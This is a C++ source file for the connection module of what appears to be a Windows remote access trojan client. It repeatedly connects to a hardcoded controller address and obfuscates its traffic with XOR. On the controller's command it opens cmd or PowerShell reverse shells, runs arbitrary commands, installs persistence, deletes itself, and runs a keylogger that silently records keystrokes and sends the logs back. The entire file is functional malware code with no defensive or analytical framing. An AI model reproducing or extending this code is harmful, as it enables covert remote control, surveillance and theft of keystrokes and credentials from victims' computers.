//#define WIN32_LEAN_AND_MEAN

#include "../inc/Connexion.h"
#include "../inc/common.h"
#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/Exec.h"
#include "../inc/Destruction.h"
#include "../inc/ErrorCodes.h"

using namespace std;


Connexion::Connexion()
{
    
    a_keylogger->setup();;
} 


INT Connexion::openConnexion()
{     
    Sleep(500);

    WSADATA WSAData; 
    
    SOCKADDR_IN address_client;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    a_sock =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
    a_keylogger->setSocket(a_sock);

    address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(PORT);

    while(connect(a_sock,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(TIMEOUT_SOCK_RECONNECT);
        //Whait...;  
    } 
    return 0;
}


INT Connexion::main()
{   
    wstring command;
    vector <string> result;
    INT len_recv=0;    
    BOOL status_destruction = FALSE; //Test if error in Destruction
    WCHAR prog[20];

    INT error_codes = 0;
    
    while(TRUE)
    {
        command = recvSafe(); //Recv safe and decrypt xor
        
        wcout << "command recv: " << command << "<----" <<endl;
        wcout << "command len: " << command.length() << endl;
        

        if(command.find(L"is_life?") != wstring::npos)
        {
            ;
            //if find is_life then continue
        }
        else
        {
            //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
            if(command==L"exit")//change 
            {
                break;
            }
            else if (command.empty())
            {
                //Connection is down or error.
                ;
            }
            else if(command.substr(0,2)==L"cd")
            {
            //Change directory
                wcout << "\n\nchange directoy: \n" << endl;
                if(changeDirectory(command.substr(3)))
                {
                    result.push_back("[-] Error when changing folder.");

                }
                else
                {
                    wcout << "Change directory: " << GetLastError() << endl;
                    result.push_back(ConvertWideToUtf8(getPath())); 
                    wcout << getPath() << endl;  
                }

                sendCommandSafe(result);
            }

            else if(command.substr(0,16) == L"MOD_SPAWN_SHELL:")
            {   
                //test if cmd.exe or powershell.exe
                ZeroMemory(&prog, sizeof(prog));

                if(command.substr(16, command.length()) == L"cmd.exe")
                {
                    wcscpy(prog, L"cmd.exe");
                    Exec().spawnSHELL(a_sock,prog);
                }

                else
                {      
                    wcscpy(prog, L"powershell.exe");
                    Exec().spawnSHELL(a_sock,prog);
                }

            }
            else if(command.substr(0,8)==L"MOD_ALL:")
            {
                Exec().executeCommand(command.substr(8));  
            }

            else if (command.substr(0,16) == L"MOD_PERSISTENCE:")
            {
                //In mod persistence.
                Persistence persistence(a_is_admin, a_path_prog);
                error_codes = persistence.main();

                if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                {
                    sendSafe(L"MOD_PERSISTENCE:" SPLIT + int_to_wstring(error_codes));
                }
                else
                {
                    //cout << "broadcast persi" << endl;
                    ;
                }
            }
            
            else if (command.substr(0,16) == L"MOD_DESTRUCTION:") 
            { 
                Destruction destruction(a_path_prog);

                error_codes = destruction.main();

                if(command.substr(16,7) == L"default") //6 for default
                {
                    //if default then send status at server. 
                    sendSafe(L"MOD_DESTRUCTION:" SPLIT + int_to_wstring(error_codes)); //Send the statue to the server. The server will just display the status.
                }
                
                else //else  substr(15,6) == "broadcast"
                {
                    //not send status
                    ;
                }

                delete a_keylogger;
                closeConnexion();
                exit(0);
            }

            else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
            {
                wcout << "MOD_KEYLOGGER:" << endl;
                
                if(command.substr(14, 10) == L"direct_tcp")
                {
                    wcout << "directcp" << endl;
                    error_codes = a_keylogger->directTcp();
                    sendSafe(L"MOD_KEYLOGGER:" SPLIT + int_to_wstring(error_codes));
                } 


                else if(command.substr(14, 16) == L"start_silencious")
                {
                    wcout << " In start silencious" << endl;

                    error_codes = a_keylogger->silenciousStart();
                    sendSafe(L"MOD_KEYLOGGER:start_silencious:" SPLIT + int_to_wstring(error_codes));
                }


                else if(command.substr(14, 15)== L"stop_silencious")
                {
                    wcout << "in stop_silencious" << endl;
                    
                    error_codes = a_keylogger->silenciousStop();

                    sendSafe(L"MOD_KEYLOGGER:stop_silencious:" SPLIT + int_to_wstring(error_codes));
                }


                else if(command.substr(14, 8) == L"dump_all") 
                {
                   wcout << "in dump_all" << endl;
                   vector<string> dump_all = a_keylogger->dumpAllData();
                   sendCommandSafe(dump_all);
                   dump_all.clear();
                }


                else if(command.substr(14,16) == L"clean_silencious") //clean_silencious
                {
                    error_codes =  a_keylogger->silenciousClean();
                
                    sendSafe(L"MOD_KEYLOGGER:clean_silencious:" SPLIT + int_to_wstring(error_codes));
                }
                
                else if(command.substr(14, 8) == L"download")
                {
                    wcout << "go to download file !" << endl;
                    a_keylogger->sendLogFile();
                }
            }

            
            else
            {
                result = Exec().executeCommand(command);
                if(command.substr(0,3) == L"[-]")
                {;} //if error not append path.
                else
                {
                    result.push_back("\n"); //test
                    result.push_back(ConvertWideToUtf8(getPath()));
                }
                sendCommandSafe(result);
            }
        }
        command.erase(); 
        result.clear(); 
    }
    return 0;
}


wstring Connexion::recvSafe()
{
    //allows you to receive data while managing errors 
    WCHAR buffer[BUFFER_LEN] = {0};
    INT len_recv;
    wstring result;

    len_recv=recv(a_sock,(char *)buffer, sizeof(buffer), 0);
        
    if(len_recv==SOCKET_ERROR)
    {
        reConnect(); //?
        //return 1;
    }
    else
    {
        if(wcslen(buffer) == 0)
        {
            //If command empty re connect to server.
            reConnect();
            return L"";
        }

       result.append(buffer, len_recv / sizeof(WCHAR));
    }

    return XOREncryption(result);
}


VOID Connexion::sendCommandSafe(vector<string> result_of_command, BOOL encryptedData)
{ /*send data and manage errors, also allows to segment the data if it is too big.
Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
    INT status=0;
    INT i=0;
    wstring request;

    for(i=0;i< result_of_command.size(); i++)
    {   
        if(encryptedData)
        {         
            request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));    
        }
        else
        {   
            wcout <<  "Not encrypted request" << endl;
            request = ConvertUtf8ToWide(result_of_command[i]);
        }
        send(a_sock, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
        Sleep(100);   
    }
        
    status=send(a_sock, (char *)XOREncryption(L"\r\n").c_str() ,4 ,0); // send end communication.
    checkSend(status);
}


VOID Connexion::sendSafe(wstring data)
{
    INT status = send(a_sock, (char *)XOREncryption(data).c_str(), data.length() * sizeof(WCHAR), 0);
    checkSend(status);
}


VOID Connexion::checkSend(INT &status)
{
    //Test if an error occurs when sending data 
    if(status == SOCKET_ERROR)
    {
        //cout << "error in sendCommandSafe" << endl;
        reConnect();
    }
}


VOID Connexion::closeConnexion()
{   
    // Test if he can connect several times to the server.
    // Test if it should wait after x second (s) to reconnect to the server.

    //"Close socket successful.
    closesocket(a_sock);
    WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
}


VOID Connexion::reConnect()
{   
    //if the client has a token then reconnects without handshaking
    wstring request;

    closeConnexion();
    openConnexion();

    request = L"MOD_RECONNECT" SPLIT  + a_token;
    
    sendUltraSafe(a_sock, XOREncryption(request)); //send token
    sendUltraSafe(a_sock, XOREncryption(L"\r\n"));
}


SOCKET Connexion::getSocket()
{
    return a_sock;
}


VOID Connexion::setToken(wstring token)
{
    if(!token.empty())
    {
        a_token = token;
    }
    else
    {
        //if token is empty.
        WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
        INT i;

        srand(time(0)); 

        for(i=0;i< 24 ;i++){token += hex_characters[rand()%16];}
        a_token = token; 
    }
    
}


VOID Connexion::setIsAdmin(BOOL is_admin)
{
    if(is_admin)
    {
        a_is_admin = TRUE; //is admin
    }
    else
    {
        a_is_admin = FALSE; //is not admin
    }
}


VOID Connexion::setPathProg(wstring path_prog)
{
    a_path_prog = path_prog;
}

